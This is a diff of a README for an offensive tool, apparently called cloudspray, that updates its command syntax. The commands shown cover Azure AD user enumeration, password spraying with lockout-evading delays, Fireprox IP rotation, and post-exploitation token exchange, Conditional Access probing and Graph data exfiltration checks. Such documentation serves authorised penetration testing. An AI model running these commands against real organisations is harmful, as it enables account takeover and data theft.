@@ -74,10 +74,10 @@ Find which email addresses are valid Azure AD accounts:
 
 ```bash
 # MSOL method (recommended — reliable, no auth required)
-python -m cloudspray enum -d example.com -u userlist.txt -m msol -o valid-users.txt
+python3 cloudspray.py enum -d example.com -u userlist.txt -m msol -o valid-users.txt
 
 # OneDrive method (passive, but tenant-dependent)
-python -m cloudspray enum -d example.com -u userlist.txt -m onedrive -o valid-users.txt
+python3 cloudspray.py enum -d example.com -u userlist.txt -m onedrive -o valid-users.txt
 ```
 
 ### 2. Password Spray
@@ -86,10 +86,10 @@ Test valid users against passwords:
 
 ```bash
 # Single password
-python -m cloudspray spray -d example.com -u valid-users.txt -P 'Spring2026!'
+python3 cloudspray.py spray -d example.com -u valid-users.txt -P 'Spring2026!'
 
 # Password list
-python -m cloudspray spray -d example.com -u valid-users.txt -p passwords.txt
+python3 cloudspray.py spray -d example.com -u valid-users.txt -p passwords.txt
 ```
 
 ### 3. With Fireprox (Recommended)
@@ -115,30 +115,30 @@ Then run with the `-c` flag:
 
 ```bash
 # Enum through Fireprox
-python -m cloudspray -c config.yaml enum -d example.com -u userlist.txt -m msol -o valid-users.txt
+python3 cloudspray.py -c config.yaml enum -d example.com -u userlist.txt -m msol -o valid-users.txt
 
 # Spray through Fireprox
-python -m cloudspray -c config.yaml spray -d example.com -u valid-users.txt -P 'Spring2026!'
+python3 cloudspray.py -c config.yaml spray -d example.com -u valid-users.txt -P 'Spring2026!'
 ```
 
 ### 4. Post-Exploitation (after finding valid credentials)
 
 ```bash
 # FOCI token exchange — test access across Microsoft services
-python -m cloudspray post --foci
+python3 cloudspray.py post --foci
 
 # Probe for Conditional Access gaps
-python -m cloudspray post --ca-probe
+python3 cloudspray.py post --ca-probe
 
 # Check Graph API data access
-python -m cloudspray post --exfil
+python3 cloudspray.py post --exfil
 ```
 
 ### 5. Reporting
 
 ```bash
-python -m cloudspray report -f json -o results.json
-python -m cloudspray report -f csv -o results.csv
+python3 cloudspray.py report -f json -o results.json
+python3 cloudspray.py report -f csv -o results.csv
 ```
 
 ## Configuration
@@ -184,7 +184,7 @@ enum:
 Most spray settings can be overridden via CLI flags:
 
 ```bash
-python -m cloudspray spray -d example.com -u users.txt -P 'password' \
+python3 cloudspray.py spray -d example.com -u users.txt -P 'password' \
     --delay 60 --jitter 10 --lockout-threshold 5 --lockout-cooldown 3600
 ```
 
